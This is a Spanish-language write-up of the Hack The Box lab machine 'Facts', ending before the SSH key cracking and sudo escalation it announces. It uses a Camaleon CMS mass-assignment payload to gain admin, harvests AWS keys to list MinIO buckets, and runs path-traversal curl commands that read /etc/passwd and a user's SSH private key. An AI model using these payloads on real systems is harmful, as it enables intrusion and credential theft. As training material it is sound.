---
title: Facts - Easy (HTB)
permalink: /Facts-HTB-Writeup/
tags:
  - Easy
  - Linux
  - "Camaleon CMS"
  - CVE-2025-2304
  - "S3 Enumeration"
  - CVE-2024-46987
  - "SSH Key Cracking"
  - "Hash Cracking"
  - Sudoers
  - facter
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Facts - Easy (HTB)
seo_description: Una versión vulnerable de Camaleon CMS y una contraseña débil en una clave SSH permitió acceso completo al servidor.
excerpt: Una versión vulnerable de Camaleon CMS y una contraseña débil en una clave SSH permitió acceso completo al servidor.
header:
  overlay_image: /assets/images/headers/facts-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/facts-hackthebox.jpg
---
![image-center](/assets/images/posts/facts-hackthebox.png)
{: .align-center}

**Habilidades:** CVE-2025-2304 - `Camaleon CMS` `< 2.9.1` Privilege Escalation, AWS S3 Enumeration, CVE-2024-46987 - Arbitrary Path Traversal in `Camaleon CMS 2.8.0`, SSH Key Cracking, Abusing Sudoers Privileges - `facter
{: .notice--primary}

# Introducción

Facts es una máquina Easy en HackTheBox que implementa una plataforma web basada en una versión de Camaleon CMS vulnerable a una escalada de privilegios (CVE-2025-2304) y a Path Traversal (CVE-2024-46987). Mediante la explotación de la última obtendremos un par de claves SSH, y luego de descifrar la contraseña de la clave privada ganaremos acceso inicial.

La escalada de privilegios es posible mediante la explotación de privilegios Sudoers configurados para la herramienta `facter`, la cual permite cargar un script malicioso para ejecutar comandos, lo que nos permitirá completar la máquina.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

``` bash
export TARGET_IP=10.129.18.34
ping -c1 "$TARGET_IP"           
PING 10.129.18.34 (10.129.18.34) 56(84) bytes of data.
64 bytes from 10.129.18.34: icmp_seq=1 ttl=62 time=322 ms

--- 10.129.18.34 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 322.317/322.317/322.317/0.000 ms
```


## Port Scanning 

Lanzaremos un escaneo de puertos que intente identificar puertos abiertos en la máquina víctima. Primeramente el escaneo será por el protocolo TCP/IPv4

``` bash
rustscan -a "$TARGET_IP" --ulimit 5000 -- -sC -sV -Pn -n -oN services

Nmap scan report for 10.129.18.34
Host is up, received user-set (0.24s latency).
Scanned at 2026-06-06 09:50:08 -04 for 40s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNYjzL0v+zbXt5Zvuhd63ZMVGK/8TRBsYpIitcmtFPexgvOxbFiv6VCm9ZzRBGKf0uoNaj69WYzveCNEWxdQUww=
|   256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCNb2NXAGnDBofpLTCGLMyF/N6Xe5LIri/onyTBifIK
80/tcp    open  http    syn-ack nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
54321/tcp open  http    syn-ack Golang net/http server
|_http-server-header: MinIO
| http-methods: 
|_  Supported Methods: GET OPTIONS
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18B6822D82BC2138
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 06 Jun 2026 13:50:34 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>18B6822D82BC2138</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18B6822938542DB4
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Sat, 06 Jun 2026 13:50:16 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>18B6822938542DB4</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Sat, 06 Jun 2026 13:50:16 GMT
|_    Content-Length: 0
|_http-title: Did not follow redirect to http://10.129.10.145:9001
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.99%I=7%D=6/6%Time=6A242597%P=x86_64-apple-darwin23.6.
SF:0%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\
SF:r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x
SF:20application/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20
SF:max-age=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2
SF::\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r
SF:\nX-Amz-Request-Id:\x2018B6822938542DB4\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Sat,\x2006\
SF:x20Jun\x202026\x2013:50:16\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20
SF:encoding=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Inval
SF:id\x20Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource
SF:><RequestId>18B6822938542DB4</RequestId><HostId>dd9025bab4ad464b049177c
SF:95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOpti
SF:ons,59,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Sat,\x200
SF:6\x20Jun\x202026\x2013:50:16\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r
SF:(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1\
SF:.0\x20400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Lengt
SF:h:\x20303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nSt
SF:rict-Transport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nV
SF:ary:\x20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3
SF:fd1af9251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x2018B6822D82BC2138\r\n
SF:X-Content-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=b
SF:lock\r\nDate:\x20Sat,\x2006\x20Jun\x202026\x2013:50:34\x20GMT\r\n\r\n<\
SF:?xml\x20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>Invalid
SF:Request</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</M
SF:essage><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestId
SF:>18B6822D82BC2138</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374
SF:d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:50
Completed NSE at 09:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:50
Completed NSE at 09:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:50
Completed NSE at 09:50, 0.00s elapsed
Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.80 seconds
```

> Considera usar este tipo de escaneos con `rustscan` exclusivamente en entornos de CTFs, para otros entornos revisa la siguiente advertencia publicada en [`Github`](https://github.com/bee-san/RustScan/wiki/Usage#%EF%B8%8F-warning).
{: .notice--warning}

- `--ulimit 5000`: Acelera el escaneo incrementando el descriptor de archivo.
- `-sC`: Lanzar scripts de reconocimiento más comunes.
- `-sV`: Intentar identificar la versión del servicio que ejecuta el puerto.
- `-Pn`: Omitir descubrimiento de host (`ARP Scan`).
- `-n`: Omitir la resolución `DNS`.
- `-oN`: Exportar en formato normal, tal como se ve por consola.

En la captura veremos dos servicios, `ssh` y `http`, aunque por sus versiones no poseen vulnerabilidades explotables para este contexto.

El servidor nos intenta aplicar una redirección hacia el dominio `facts.htb`, agregaremos este nombre de dominio a nuestro archivo `/etc/hosts` para que podamos aplica correctamente las resoluciones `DNS`

``` bash
echo "$TARGET_IP facts.htb" | sudo tee -a /etc/hosts
 
10.129.18.34 facts.htb
```


## Web Enumeration

Antes de navegar hasta la web opcionalmente podemos lanzar un escaneo a las tecnologías web que el servidor pueda estar empleando (aunque ya sabemos que emplea `nginx 1.26.3`)

``` bash
whatweb http://facts.htb/                                                                
http://facts.htb/ [200 OK] Cookies[_factsapp_session], Country[RESERVED][ZZ], Email[contact@facts.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.26.3 (Ubuntu)], HttpOnly[_factsapp_session], IP[10.129.18.34], Open-Graph-Protocol[website], Script, Title[facts], UncommonHeaders[x-content-type-options,x-permitted-cross-domain-policies,referrer-policy,plugin_front_cache,x-request-id], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge], X-XSS-Protection[0], nginx[1.26.3]
```

Al navegar hasta el dominio `facts.htb` veremos la siguiente página web, en la cual podemos aprender curiosidadades

![image-center](/assets/images/posts/facts-1-hackthebox.png)
{: .align-center}

### Fuzzing

Realizaremos `fuzzing` para intentar descubrir rutas en el servidor web utilizando un diccionario de rutas posibles (en mi caso utilicé la herramienta `ffuf` aunque puedes utilizar cualquier otra)

``` bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -u 'http://facts.htb/FUZZ'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://facts.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

search                  [Status: 200, Size: 19187, Words: 3276, Lines: 272, Duration: 1409ms]
rss                     [Status: 200, Size: 183, Words: 20, Lines: 9, Duration: 2575ms]
sitemap                 [Status: 200, Size: 3508, Words: 424, Lines: 130, Duration: 2301ms]
en                      [Status: 200, Size: 11109, Words: 1328, Lines: 125, Duration: 1879ms]
page                    [Status: 200, Size: 19593, Words: 3296, Lines: 282, Duration: 2450ms]
welcome                 [Status: 200, Size: 11966, Words: 1481, Lines: 130, Duration: 1718ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1751ms]
```

Dentro del servidor web existe la ruta `/admin`, la cual retorna un código de estado `302`

> El código `302 HTTP` significa "Encontrado" (`Found`), indicando que el recurso solicitado ha sido movido a otra URL.
{: .notice--info}

Al navegar hasta la ruta `/admin`, veremos la siguiente web donde podremos iniciar sesión

![image-center](/assets/images/posts/facts-2-hackthebox.png)
{: .align-center}

Si tenemos una vista decente notaremos que podemos registrar una cuenta haciendo clic en en enlace `Create an account`, el cual nos llevará hacia `/admin/register`

### Dashboard

Al crear una nueva cuenta y entrar en la plataforma, se nos cargará el `Dashboard`

![image-center](/assets/images/posts/facts-3-hackthebox.png)
{: .align-center}

En el `footer` de la web se expone la versión de `Camaleon CMS`, la cual es la `2.9.0`

Si buscamos en internet alguna vulnerabilidad para esta versión, notaremos que posee algunas prometedoras para este escenario

![image-center](/assets/images/posts/facts-4-hackthebox.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
##  CVE-2025-2304 - `Camaleon CMS` `< 2.9.1` Privilege Escalation

[CVE-2025-2304](https://nvd.nist.gov/vuln/detail/CVE-2025-2304) es una vulnerabilidad de escalada de privilegios a través de `Mass Assignment` en la plataforma `Camaleon CMS`, concretamente en sus versiones anteriores a la `2.9.1`.

Permite a un usuario autenticado explotar la funcionalidad de cambio de contraseña para obtener privilegios administrativos dentro del `CMS`

### Understanding Vulnerability

Cuando un usuario desea cambiar su contraseña, el método se llama al método [`updated_ajax`](https://github.com/owen2345/camaleon-cms/blob/c3292fef7a84543a65584cab654a39b25bc7f523/app/controllers/camaleon_cms/admin/users_controller.rb#L52) de [`users_controller`](https://github.com/owen2345/camaleon-cms/blob/c3292fef7a84543a65584cab654a39b25bc7f523/app/controllers/camaleon_cms/admin/users_controller.rb). 

La vulnerabilidad reside en el uso peligroso del método `permit!`, el cual permite pasar todos los parámetros sin ningún tipo de filtrado

``` ruby
def updated_ajax
  @user = current_site.users.find(params[:user_id])
  update_session = current_user_is?(@user)

  @user.update(params.require(:password).permit!)
  render inline: @user.errors.full_messages.join(', ')

  # keep user logged in when changing their own password
  update_auth_token_in_cookie @user.auth_token if update_session && @user.saved_change_to_password_digest?
end
```

### Exploiting

Para explotar esta vulnerabilidad, capturaremos una solicitud de cambio de contraseña. Iremos a `Profile` > `Change Password`

![image-center](/assets/images/posts/facts-5-hackthebox.png)
{: .align-center}

En este punto podemos enviarla al `Repeater`. Añadiremos el siguiente payload a la solicitud HTTP en `Burpsite`

``` bash
&password%5Brole%5D=admin
```

De forma que nuestra nueva solicitud luzca más o menos de la siguiente manera, con el payload añadido al final de los datos que se envían por `POST` hacia el endpoint `/admin/users/X/updated_ajax`

![image-center](/assets/images/posts/facts-6-hackthebox.png)
{: .align-center}

Luego de procesar la solicitud, al recargar la web, notaremos que desbloqueamos las funcionalidades de administración

![image-center](/assets/images/posts/facts-7-hackthebox.png)
{: .align-center}

Inspeccionando las opciones y funcionalidades, podremos encontrar credenciales `AWS` desde `Settings` > `General Site` > `Filesystem Settings`

![image-center](/assets/images/posts/facts-8-hackthebox.png)
{: .align-center}


## AWS S3 Enumeration

En la web veremos que el servicio en cuestión se ejecuta en el puerto `54321`, el cual desde la captura de `nmap` que hicimos en el reconocimiento vimos se trata del servicio `MinIO`.

> `MinIO` es un sistema de almacenamiento de objetos de alto rendimiento, diseñado para ser compatible con la API del servicio en la nube `Amazon S3`. 
{: .notice--info}

> Tras explotar la página web, descubrimos credenciales `AWS`, podemos utilizarlas para conectarnos al `S3` y enumerar este servicio expuesto en búsqueda de información que nos permita ampliar la superficie de ataque.
{: .notice}

Comenzaremos configurando un perfil para la herramienta [`aws cli`](https://www.bluematador.com/learn/aws-cli-cheatsheet) con las credenciales que encontramos en la plataforma

``` bash
aws configure --profile exegol
AWS Access Key ID [None]: AKIA8F803777B28237C4
AWS Secret Access Key [None]: MxBHrzR9nG+E0qozXDAYeqvF89ftpPmbUiFBow+L
Default region name [None]: us-east-1
Default output format [None]: 
```

A continuación, listamos los buckets disponibles en el servidor. En este caso observaremos dos: `internal` y `randomfacts`

``` bash
aws s3 ls s3:// --endpoint-url http://facts.htb:54321 --profile exegol
2025-09-11 09:06:52 internal
2025-09-11 09:06:52 randomfacts
```

El bucket `randomfacts` en este caso contiene los archivos que se cargan en la web

``` bash
aws s3 ls s3://randomfacts --endpoint-url http://facts.htb:54321 --profile exegol
                           PRE thumb/
2025-09-11 09:07:06     446847 animalejected.png
2025-09-11 09:07:06     271210 annefrankasteroid.png
2025-09-11 09:07:06     255778 catsattachment.png
2025-09-11 09:07:05     411597 cuteanimals.png
2025-09-11 09:07:05     177331 darkchocolate.png
2025-09-11 09:07:05     312753 dogscatssmell.png
2025-09-11 09:07:04     922561 dolphinfact.png
2025-09-11 09:07:04      67352 finlandhappiest.png
2025-09-11 09:07:04     388178 firstimpressions.png
2025-09-11 09:07:04     100689 firsttransaction.png
2025-09-11 09:07:03     222436 firstwebcam.png
2025-09-11 09:07:03     128158 georgewashingtonslaves.png
2025-09-11 09:07:03      34816 logopage.png
2025-09-11 09:07:03      16886 logopage2.png
2025-09-11 09:07:02      80796 pressureupbeat.png
2025-09-11 09:07:02      24792 primary-question-mark.png
2025-09-11 09:07:02     341284 smallanimals.png
2025-09-11 09:07:02     332397 superiorpeople.png
2025-09-11 09:07:01      39579 vanilla.png
2025-09-11 09:07:01      35769 youtubewatchhours.png
```

Inspeccionaremos el contenido del bucket `internal`, veremos lo que parece ser el directorio `/home` de un usuario

``` bash
aws s3 ls s3://internal --endpoint-url http://facts.htb:54321 --profile exegol   
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 15:45:13        220 .bash_logout
2026-01-08 15:45:13       3900 .bashrc
2026-01-08 15:47:17         20 .lesshst
2026-01-08 15:47:17        807 .profile
```

Para analizar los archivos del bucket podemos descargarlos en nuestra máquina de forma recursiva con el comando `sync`

``` bash
aws s3 sync s3://internal/ aws --endpoint-url http://facts.htb:54321 --profile exegol
```

El contenido del directorio `.ssh` puede ser interesante porque allí normalmente se alojan claves SSH que pueden ser utilizadas para conectarnos remotamente

``` bash
find .ssh
.ssh
.ssh/id_ed25519
.ssh/authorized_keys
```

En este caso disponemos de una clave en el algoritmo `Ed25519`, además del archivo `authorized_keys`.

> Generalmemte un archivo `authorized_keys` contiene un comentario en la clave pública que identifica al usuario (`algoritmo CLAVE_PUBLICA user@host`). Sin embargo, en este caso el comentario fue borrado.
{: .notice--info}

Podríamos intentar buscar información en el directorio actual o en la web que identifique a un usuario posiblemente válido a nivel de sistema. 

Aunque también es posible que esto simplemente sea una pista que el creador ha dejado para que comprendamos el entorno.


## CVE-2024-46987 - Arbitrary Path Traversal in `Camaleon CMS 2.8.0`

[CVE-2024-46987](https://nvd.nist.gov/vuln/detail/CVE-2024-46987) es una vulnerabilidad de tipo `Path Traversal` identificado en `Camaleon CMS`, la cual permite a usuarios autenticados descargar cualquier archivo del servidor que ejecuta `Camaleon CMS` dependiendo de sus permisos.

> El `Path Traversal` (o recorrido de directorio) es una vulnerabilidad web que permite a un atacante acceder a archivos y directorios no autorizados fuera de la carpeta raíz web, utilizando caracteres especiales como `../` en la URL o campos de entrada.
{: .notice--info}

### Understanding Vulnerability

> `Camaleon CMS` es un gestor de contenido dinámico basado en `Ruby on Rails`.
{: .notice--info}

El problema radica en cómo la clase `MediaController` procesa valores que el usuario envía al servidor. En el método [`download_private_file`](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/controllers/camaleon_cms/admin/media_controller.rb#L28) dentro de la clase `MediaController` se define la siguiente lógica

``` ruby
def download_private_file
  cama_uploader.enable_private_mode!

  file = cama_uploader.fetch_file("private/#{params[:file]}")

  send_file file, disposition: 'inline'
end
```

Permite al usuario solicitar un archivo privado, concretamente se envía el valor del parámetro `file` a la función `fetch_file`. El servidor no sanitiza el valor que envía el usuario, pasando directamente el nombre del archivo, incluyendo los caracteres de ruta

``` ruby
def fetch_file(file_name)
  raise ActionController::RoutingError, 'File not found' unless file_exists?(file_name)

  file_name
end
```

Un usuario autenticado puede descargar archivos del servidor visitando la siguiente URL

``` http
http://vulnerable-website.com/admin/media/download_private_file?file=../../../etc/passwd
```

### Exploiting

Podemos utilizar `curl` haciendo uso de las cookies que nos autentican en la web para ver archivos del servidor

``` bash
# Cookies de la web
export COOKIES='_factsapp_session=WpMQTF4xQXmwBpqbNVb7h88cRKBhLdeSMH%2FmHJJ3osGXUjyBsGGLqbczYKUJguJvydJh5%2BCo7YBzffb3fDWtbL0gJQA3Wob2stwW85oVnt%2BF9u9q9ZXJtWfgdraUiGeY7GDjFHdllWguskGPinwzENPpH5XmM6YNBPsj5AGxxS6EWc9Qo%2BkyA%2Bxfd8nTSYqVlTKVT44xG8E8YZnhxlPCitthR6nRVoT4Dv7TqOl3LO17mFfYDAvMmzj20g%2BYek7nSPUCspgNhg%2FLfiH4Zl%2FOZT2XwtB%2FT1OFNuUBFAgk62Nml%2B%2BV8rkyYUWSxYKzsjMOMPv9aNt%2BSkkxSc8QxPJqP0K2mOxxxuQIUZQ%2FxTPa01ce1Bq2hg5u1JrZdRgoa7o9fw%3D%3D--mJsdTzkWcu2%2F3VsB--M7sKPAqFzpGrqcms0IGf9A%3D%3D; auth_token=i4WLYVIk6CP-Ae5GBPkEHw&Mozilla%2F5.0+%28Macintosh%3B+Intel+Mac+OS+X+10.15%3B+rv%3A151.0%29+Gecko%2F20100101+Firefox%2F151.0&10.10.15.30'

curl -sL 'http://facts.htb/admin/media/download_private_file?file=../../../etc/passwd' -b "$COOKIES"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

Notaremos que existen los usuarios `trivia` y `william` además de `root`

``` bash
curl -sL 'http://facts.htb/admin/media/download_private_file?file=../../../etc/passwd' -b "$COOKIEs" | grep sh$

root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

### SSH Private Key

Podemos intentar exfiltrar la clave privada SSH de alguno de los usuarios (`trivia` o `william`).

> Como `tip` podemos intentar conectarnos para ver el algoritmo que utiliza `ssh`, aunque ya lo supimos al ver la clave SSH y el archivo `authorized_keys` del bucket expuesto.
{: .notice}

``` bash
ssh trivia@facts.htb
The authenticity of host 'facts.htb (10.129.19.175)' can't be established.
ED25519 key fingerprint is SHA256:fygAnw6lqDbeHg2Y7cs39viVqxkQ6XKE0gkBD95fEzA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? 
```

Como sabemos que el algoritmo es `ED25519`, buscaremos una clave privada con el nombre `id_ed25519`.

Apuntaremos al directorio `.ssh` de cada usuario para intentar ver su clave privada

``` bash
curl -sL 'http://facts.htb/admin/media/download_private_file?file=../../../home/trivia/.ssh/id_ed25519' -b "$COOKIES" | tee trivia_ed_25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABB4tDAi34
R6cNsxmw8URMoGAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAII53fgz/mVxsXY56
Na+PJ2s/ImqvyTJ8CvShatwOAgIeAAAAoB31LGzTcnrNI1hKh2ZTogf4cUN9LohwoQ3B9J
qlPgbRhDGfau3gh47Ftw1/5HTo9ggyKjzrTubCl4ot9pbe+FzdgPjwgvPHH/u4qeXwnizZ
5/yWec2/FCwkttXgd00ZAY/Zz0/0nV1g5ArRieD9HHzpPGHW3Ygc2HDRvNFktwrSea5a4p
Rcs30IAz5Cc7vqScj35/CurnFdbVdv2e4RZLw=
-----END OPENSSH PRIVATE KEY-----
```

> Creo que es necesario mencionar que estos archivos difieren, por lo que el par de claves encontrados anteriormente posiblemente sean antiguas o correspondan a otro usuario.
>  
>  Lo único que comparten en común es que ambas claves privadas están cifradas por contraseña.
{: .notice--warning}

``` bash
diff trivia_ed_25519 bucket/id_ed25519
2,7c2,7
< b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABB4tDAi34
< R6cNsxmw8URMoGAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAII53fgz/mVxsXY56
< Na+PJ2s/ImqvyTJ8CvShatwOAgIeAAAAoB31LGzTcnrNI1hKh2ZTogf4cUN9LohwoQ3B9J
< qlPgbRhDGfau3gh47Ftw1/5HTo9ggyKjzrTubCl4ot9pbe+FzdgPjwgvPHH/u4qeXwnizZ
< 5/yWec2/FCwkttXgd00ZAY/Zz0/0nV1g5ArRieD9HHzpPGHW3Ygc2HDRvNFktwrSea5a4p
< Rcs30IAz5Cc7vqScj35/CurnFdbVdv2e4RZLw=
---
> b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDX551zOK
> zg+oMPWtnO0IW7AAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAINQdOg7IH7VtmuIp
> SwcK5IOGDJFiOOOUd0DprwciNfTFAAAAoEFuyQbTGuZzCDLzlY/IQy7fKkA6rLNsaopMcQ
> qW0tbzDy8pO9Tfafqn5B4UiurG1jF0pUcKIzLggGY/b/UxgTkw9BE/ICMNQ3yjNSM9gVjs
> 5rfp+KJG/Bg4Owb13L1kQoqhvjj/HZd4gX86shkiESRojHOmQleYJyV2UlF1lKGDA0g0Kx
> 0ammgUZGAHUykocGVQwRv4pVzQVXsou0CHhhc=

diff id_ed25519.pub bucket/id_ed25519.pub 
1c1
< ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFFKQisjwNsfSqbdGEx+Iiw0ecNPqWUjmsj2o0w6U8Cp 
---
> ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINQdOg7IH7VtmuIpSwcK5IOGDJFiOOOUd0DprwciNfTF 
```

Guardaremos esta clave privada dentro de un archivo y asignaremos permisos de lectura y escritura para solo para el usuario.

``` bash
chmod 600 trivia_id_ed25519
```

De igual forma, descargaremos el archivo `authorized_keys` y lo guardaremos como una clave pública

